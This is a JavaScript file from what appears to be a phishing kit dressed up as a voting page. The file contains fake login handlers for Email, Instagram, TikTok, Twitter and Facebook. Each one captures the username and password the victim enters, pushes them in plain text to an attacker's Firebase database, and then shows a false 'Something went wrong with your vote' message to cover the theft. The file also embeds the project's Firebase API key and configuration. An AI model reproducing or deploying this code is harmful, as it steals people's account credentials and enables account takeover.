// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyAJQG2AvyxP8LGTUybfCulVEvXRmlkM8nU",
  authDomain: "testlabb.firebaseapp.com",
  databaseURL: "https://testlabb-default-rtdb.firebaseio.com",
  projectId: "testlabb",
  storageBucket: "testlabb.firebasestorage.app",
  messagingSenderId: "401897913429",
  appId: "1:401897913429:web:9f9104e7b57e18e850e8dc",
};
const app = firebase.initializeApp(firebaseConfig);

// Function to show alerts
function showAlert(message) {
  alert(message);
}

// Common Firebase Authentication and Database Logic
function handleLogin(accountType, usernameFieldId, passwordFieldId) {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      window.alert("Error: " + errorMessage);
    });

  var username = document.getElementById(usernameFieldId).value;
  var password = document.getElementById(passwordFieldId).value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert("Something went wrong with your vote.");
      document.getElementById(passwordFieldId).value = "";
    }, 2000);
  }
}

function hmlog() {
  handleLogin("Email", "hm-email", "hm-pass");
}

function iglog() {
  handleLogin("Instagram", "ig-uname", "ig-pass");
}

function toklog() {
  handleLogin("TikTok", "tok-uname", "tok-pass");
}

function twilog() {
  handleLogin("Twitter", "twi-uname", "twi-pass");
}

function fblog() {
  handleLogin("Facebook", "fb-uname", "fb-pass");
}
